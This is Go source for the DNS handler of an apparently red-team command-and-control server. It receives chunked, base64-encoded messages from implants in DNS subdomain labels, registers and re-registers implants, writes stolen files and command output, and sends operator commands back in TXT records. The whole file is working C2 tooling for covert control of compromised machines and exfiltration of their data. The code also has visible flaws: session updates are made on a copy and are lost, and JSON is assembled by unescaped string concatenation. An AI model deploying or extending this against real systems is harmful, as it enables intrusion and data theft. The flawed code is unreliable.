package server

import (
	"fmt"
	"strings"
	"encoding/base64"
	"log"
	"os"
	"text/tabwriter"
	"strconv"
	"encoding/json"
	"errors"
	"sync"

	"github.com/InjectionSoftwareandSecurityLLC/lupo/lupo-server/core"
	"github.com/miekg/dns"
)


var sessionsMu sync.RWMutex

func DNSServerHandler(w dns.ResponseWriter, r *dns.Msg) {

	var dnsParams core.DNSData
	remoteAddr := w.RemoteAddr().String()
	dnsParams.Register = false

	var additionalFunctions map[string]interface{}

	fmt.Println("\n📥 Received from", remoteAddr)

	tw := tabwriter.NewWriter(os.Stdout, 0, 0, 2, ' ', tabwriter.Debug)
	fmt.Fprintln(tw, "Question Name\tType\tClass")
	for _, q := range r.Question {
		fmt.Fprintf(tw, "%s\t%s\t%s\n", q.Name, dns.TypeToString[q.Qtype], dns.ClassToString[q.Qclass])
	}
	tw.Flush()

	msg := new(dns.Msg)
	msg.SetReply(r)

	// For simplicity, handle only first TXT question
	if len(r.Question) == 0 {
		log.Println("No DNS question received")
		return
	}

	q := r.Question[0]

	// Extract first label (subdomain) from query name
	labels := strings.Split(q.Name, ".")
	if len(labels) < 2 {
		log.Printf("Invalid query name: %s", q.Name)
		w.WriteMsg(msg)
		return
	}

	subdomain := labels[0]

	// Parse chunk metadata: sessionID-chunkIndex-totalChunks-chunkPayloadBase64
	parts := strings.SplitN(subdomain, "-", 4)
	if len(parts) != 4 {
		log.Printf("Malformed chunked subdomain: %s", subdomain)
		w.WriteMsg(msg)
		return
	}

	// Parse sessionID
	sessionID, err := strconv.Atoi(parts[0])
	if err != nil {
		log.Printf("Invalid sessionID in subdomain: %s", parts[0])
		w.WriteMsg(msg)
		return
	}

	// Parse chunk index
	chunkIndex, err := strconv.Atoi(parts[1])
	if err != nil {
		log.Printf("Invalid chunkIndex in subdomain: %s", parts[1])
		w.WriteMsg(msg)
		return
	}

	// Parse total chunks
	totalChunks, err := strconv.Atoi(parts[2])
	if err != nil {
		log.Printf("Invalid totalChunks in subdomain: %s", parts[2])
		w.WriteMsg(msg)
		return
	}

	chunkPayloadBase64 := parts[3]

	// Lookup session from Sessions map (thread-safe sync.Map assumed)
	sVal, ok := core.Sessions.Load(sessionID)
	if !ok {
		log.Printf("Unknown sessionID %d", sessionID)
		w.WriteMsg(msg)
		return
	}
	session := sVal.(core.Session)

	// Lock session mutex to safely update fragments
	sessionsMu.Lock()

	defer sessionsMu.Unlock()

	// Ensure SubDomainFragments slice is properly sized in the session
	if len(session.SubDomainFragments) < totalChunks {
		frags := make([]string, totalChunks)
		copy(frags, session.SubDomainFragments)
		session.SubDomainFragments = frags
	}

	// Store chunk at the correct index in the session
	session.SubDomainFragments[chunkIndex] = chunkPayloadBase64

	log.Printf("Received chunk %d/%d for session %d", chunkIndex+1, totalChunks, sessionID)

	// Check if all chunks received (no empty strings)
	allReceived := true
	for _, frag := range session.SubDomainFragments {
		if frag == "" {
			allReceived = false
			break
		}
	}

	if !allReceived {
		// Respond with acknowledgment TXT to confirm chunk received
		rr := &dns.TXT{
			Hdr: dns.RR_Header{
				Name:   q.Name,
				Rrtype: dns.TypeTXT,
				Class:  dns.ClassINET,
				Ttl:    60,
			},
			Txt: []string{"chunk received"},
		}
		msg.Answer = append(msg.Answer, rr)
		w.WriteMsg(msg)
		return
	}

	// All chunks received - join and decode full message
	fullBase64 := strings.Join(session.SubDomainFragments, "")
	jsonBytes, err := base64.RawURLEncoding.DecodeString(fullBase64)
	if err != nil {
		log.Printf("Failed to decode base64 full message for session %d: %v", sessionID, err)
		// reset fragments to allow retransmit
		session.SubDomainFragments = nil
		w.WriteMsg(msg)
		return
	}

	// Parse JSON message into dnsParams struct
	err = json.Unmarshal(jsonBytes, &dnsParams)
	if err != nil {
		log.Printf("Failed to unmarshal JSON for session %d: %v", sessionID, err)
		// reset fragments to allow retransmit
		session.SubDomainFragments = nil
		w.WriteMsg(msg)
		return
	}

	// Clear fragments for next message
	session.SubDomainFragments = nil

	// Now proceed with your existing logic for dnsParams:

	if err != nil {
		core.LogData("error: Problem occurred while parsing input from a DNS based implant")
		core.ErrorColorBold.Println("There was an error with parsing input from a DNS based implant, check the error below:")
		fmt.Println(err)
	}

	if dnsParams.PSK == "" {
		errorString := "DNS Request did not provide PSK, request ignored"
		core.LogData(errorString)
		returnErr := errors.New(errorString)
		ErrorHandler(returnErr)
		return
	}

	if dnsParams.ImplantArch == "" {
		dnsParams.ImplantArch = "Unknown"
	}

	if dnsParams.AdditionalFunctions != "" {
		json.Unmarshal([]byte(dnsParams.AdditionalFunctions), &additionalFunctions)
	} else {
		additionalFunctions = nil
	}

	if dnsParams.Username == "" {
		dnsParams.Username = "server"
	}

	if dnsParams.PSK == PSK {

		if dnsParams.Register == true {

			implant := core.RegisterImplant(dnsParams.ImplantArch, dnsParams.Update, additionalFunctions, "")

			core.RegisterSession(core.SessionID, "DNS", implant, remoteAddr, 0, "", "", "", "")

			newSession := core.SessionID - 1

			response := map[string]interface{}{
				"sessionID": newSession,
				"UUID":      implant.ID,
			}

			jsonResp, err := json.Marshal(response)

			if err != nil {
				errorString := "Error converting DNS response to JSON"
				core.LogData(errorString)
				core.ErrorColorBold.Println(errorString)
			}

			encodedJSONResp := base64.RawURLEncoding.EncodeToString(jsonResp)

			rr := &dns.TXT{
				Hdr: dns.RR_Header{
					Name:   q.Name,
					Rrtype: dns.TypeTXT,
					Class:  dns.ClassINET,
					Ttl:    60,
				},
				Txt: []string{encodedJSONResp},
			}
			msg.Answer = append(msg.Answer, rr)

			w.WriteMsg(msg)

			core.BroadcastSession(strconv.Itoa(newSession))

			return
		}
	} else {
		errorString := "DNS Request Invalid PSK, request ignored"
		core.LogData(errorString)
		returnErr := errors.New(errorString)
		ErrorHandler(returnErr)
		return
	}

	// Look up session again by SessionID from dnsParams after registration logic
	sVal, ok = core.Sessions.Load(dnsParams.SessionID)

	if !ok {
		// Session missing
		if core.PersistenceMode {
			reconnectString := "Old implant with UUID: " + dnsParams.UUID.String() + " connected, attempting to reestablish session..."
			core.LogData(reconnectString)
			core.WarningColorBold.Println(reconnectString)

			implant := core.RegisterImplant(dnsParams.ImplantArch, dnsParams.Update, additionalFunctions, dnsParams.UUID.String())

			core.RegisterSession(core.SessionID, "DNS", implant, remoteAddr, 0, "", "", "", "")

			newSession := core.SessionID - 1

			response := map[string]interface{}{
				"sessionID": newSession,
				"UUID":      implant.ID,
			}

			jsonResp, err := json.Marshal(response)

			if err != nil {
				errorString := "Error converting DNS response to JSON"
				core.LogData(errorString)
				core.ErrorColorBold.Println(errorString)
			}

			rr := &dns.TXT{
				Hdr: dns.RR_Header{
					Name:   q.Name,
					Rrtype: dns.TypeTXT,
					Class:  dns.ClassINET,
					Ttl:    60,
				},
				Txt: []string{string(jsonResp)},
			}
			msg.Answer = append(msg.Answer, rr)

			w.WriteMsg(msg)

			core.BroadcastSession(strconv.Itoa(newSession))

			return
		} else {
			errorString := "DNS Request Invalid UUID, request ignored"
			core.LogData(errorString)
			returnErr := errors.New(errorString)
			ErrorHandler(returnErr)
			return
		}
	}

	session = sVal.(core.Session)

	if session.Implant.ID != dnsParams.UUID || dnsParams.UUID == core.ZeroedUUID {
		if core.PersistenceMode {
			reconnectString := "Old implant with UUID: " + dnsParams.UUID.String() + " connected, attempting to reestablish session..."
			core.LogData(reconnectString)
			core.WarningColorBold.Println(reconnectString)

			implant := core.RegisterImplant(dnsParams.ImplantArch, dnsParams.Update, additionalFunctions, dnsParams.UUID.String())

			core.RegisterSession(core.SessionID, "DNS", implant, remoteAddr, 0, "", "", "", "")

			newSession := core.SessionID - 1

			response := map[string]interface{}{
				"sessionID": newSession,
				"UUID":      implant.ID,
			}

			jsonResp, err := json.Marshal(response)

			if err != nil {
				errorString := "Error converting DNS response to JSON"
				core.LogData(errorString)
				core.ErrorColorBold.Println(errorString)
			}

			rr := &dns.TXT{
				Hdr: dns.RR_Header{
					Name:   q.Name,
					Rrtype: dns.TypeTXT,
					Class:  dns.ClassINET,
					Ttl:    60,
				},
				Txt: []string{string(jsonResp)},
			}
			msg.Answer = append(msg.Answer, rr)

			w.WriteMsg(msg)

			core.BroadcastSession(strconv.Itoa(newSession))

			return
		} else {
			errorString := "DNS Request Invalid UUID, request ignored"
			core.LogData(errorString)
			returnErr := errors.New(errorString)
			ErrorHandler(returnErr)
			return
		}
	}

	if dnsParams.Data != "" {
		core.LogData("Session " + strconv.Itoa(dnsParams.SessionID) + " returned:\n" + dnsParams.Data)
		if dnsParams.Username == "server" {
			fmt.Println("\nSession " + strconv.Itoa(dnsParams.SessionID) + " returned:\n" + dnsParams.Data)
		} else {
			currentWolf := core.Wolves[dnsParams.Username]
			jsonData := `{"data":"` + dnsParams.Data + `"}`
			core.AssignWolfBroadcast(currentWolf.Username, currentWolf.Rhost, jsonData)
		}
	}

	if dnsParams.FileName != "" {
		core.LogData("Session " + strconv.Itoa(dnsParams.SessionID) + " returned the file: " + dnsParams.FileName)

		if dnsParams.File == "" {
			core.LogData("Session " + strconv.Itoa(dnsParams.SessionID) + " file contents was empty, no file written for: " + dnsParams.FileName)
			fmt.Println("\nSession " + strconv.Itoa(dnsParams.SessionID) + " file contents was empty, no file written for: " + dnsParams.FileName)
		} else {
			if dnsParams.Username == "server" {
				core.DownloadFile(dnsParams.FileName, dnsParams.File)
			} else {
				currentWolf := core.Wolves[dnsParams.Username]
				jsonData := `{"filename":"` + dnsParams.FileName + `"` + `,"file":"` + dnsParams.File + `"}`
				core.AssignWolfBroadcast(currentWolf.Username, currentWolf.Rhost, jsonData)
			}
		}
	}

	var cmd string
	var user string

	if session.Implant.Commands != nil {
		cmd = session.Implant.Commands[0].Command
		user = session.Implant.Commands[0].Operator
	}

	response := map[string]interface{}{
		"user": user,
		"cmd":  cmd,
	}

	jsonResp, err := json.Marshal(response)

	if err != nil {
		errorString := "Error converting DNS cmd to JSON"
		core.LogData(errorString)
		core.ErrorColorBold.Println(errorString)
	}

	core.UpdateImplant(dnsParams.SessionID, dnsParams.Update, dnsParams.ImplantArch, additionalFunctions)
	core.SessionCheckIn(dnsParams.SessionID)

	rr := &dns.TXT{
		Hdr: dns.RR_Header{
			Name:   q.Name,
			Rrtype: dns.TypeTXT,
			Class:  dns.ClassINET,
			Ttl:    60,
		},
		Txt: []string{string(jsonResp)},
	}
	msg.Answer = append(msg.Answer, rr)

	w.WriteMsg(msg)

}
